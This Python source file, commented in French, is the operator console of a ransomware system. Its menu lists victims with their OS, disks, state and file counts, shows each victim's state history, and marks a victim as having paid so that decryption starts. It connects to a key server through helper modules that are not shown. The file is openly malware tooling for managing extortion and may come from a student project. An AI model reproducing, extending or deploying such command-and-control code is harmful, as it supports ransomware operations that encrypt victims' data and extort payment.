import socket
from datetime import datetime
import utile.network as network
import utile.message as message
'''import utile.security as security
import utile.config as config
import utile.input as my_input'''


# Constantes
IP_SERV_CONSOLE = socket.gethostname()
PORT_SERV_CONSOLE = 8381


def format_timestamp(timestamp):
    # Convertir le timestamp en objet datetime
    dt_object = datetime.fromtimestamp(timestamp)
    # Formater la date selon le format souhaité
    formatted_date = dt_object.strftime("%d/%m/%Y %H:%M:%S")

    return formatted_date


def affichage_menu():
    print("")
    print("============================================================================")
    print("CONSOLE DE CONTROLE DU RANSOMWARE")
    print("============================================================================")
    print("1) Liste de victimes du ransomware")
    print("2) Historiques des états d'une victime")
    print("3) Renseigner le payement de rançon d'une victime")
    print("4) Quitter")


def affichage_liste_victimes():

    print("")
    print("============================================================================")
    print("LISTING DES VICTIMES DU RANSOMWARE")
    print("============================================================================")
    # Envoi de la requête
    s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
    msg = message.set_message("LIST_VICTIM_REQ")
    network.send_message(s, msg)
    # recevoir la réponse
    response = network.receive_message(s)
    if response is None:
        print("Aucune réponse reçue.")
        return
    # affiche les données reçues
    while response is not None and message.get_message_type(response) != 'LIST_END':
        data = list(response.values())
        print(
            f"ID : {data[0]} | OS: {data[1]} | Disks: {data[2]} | State: {data[3]} | Nb_files: {data[4]}")
        response = network.receive_message(s)


def affichage_historique_etat_victime():
    print("")
    print("============================================================================")
    print("HISTORIQUE DES ETATS DE LA VICTIME")
    print("============================================================================")
    # Connexion au serveur
    s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
    # Récupération de l'id de la victime
    victim_id = input("Entrez le numéro de la victime : ")
    # Envoi de la requête
    msg = message.set_message("HISTORY_REQ")
    network.send_message(s, msg)
    network.send_message(s, victim_id)
    # Récupération de la réponse
    response = network.receive_message(s)
    if response is None:
        print("Aucune réponse reçue.")
        return
    # Affichage de l'historique
    while response is not None and message.get_message_type(response) != 'HIST_END':
        data = list(response.values())
        print(
            f"ID_STATES: {data[0]} | ID_VICTIM: {data[1]} | TIMESTAMP: {format_timestamp(data[2])} | STATE: {data[3]}")
        response = network.receive_message(s)


def affichage_payement_rancon():
    print("")
    print("")
    print("RENSEIGNER LE PAYEMENT DE RANCON D'UNE VICTIME")
    print("______________________________________________")
    # Connexion au serveur
    s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
    # Récupération de l'id de la victime
    victim_id = input("Entrez le numéro de la victime : ")
    # Envoi de la requête
    msg = message.set_message("CHANGE_STATE")
    network.send_message(s, msg)
    network.send_message(s, victim_id)
    # Récupération de la réponse
    response = network.receive_message(s)
    if response is None:
        print("Aucune réponse reçue.")
        return
    # Affichage de la réponse en fonction de l'état de la victime
    chgstate_value = response['CHGSTATE']
    if chgstate_value == "DECRYPT":
        print(f"La victime {victim_id} a payé la rançon. Décryptage en cours...")
    elif chgstate_value == "DECRYPTED":
        print(f"La victime {victim_id} a déja payé et est en cours de décryptage.")
    else:
        print(f"La victime {victim_id} est dans l'état {chgstate_value} et donc nous ne pouvons pas la décrypter.")


def main():
    continuer = True
    while continuer:
        affichage_menu()
        choix_user = input("Votre choix : ")
        if choix_user == "1":
            affichage_liste_victimes()
        elif choix_user == "2":
            affichage_historique_etat_victime()
        elif choix_user == "3":
            affichage_payement_rancon()
        elif choix_user == "4":
            continuer = False
            print("Au revoir")
        else:
            print("Choix invalide. Veuillez entrer un nombre entre 1 et 4.")
    exit(0)


if __name__ == '__main__':
    main()
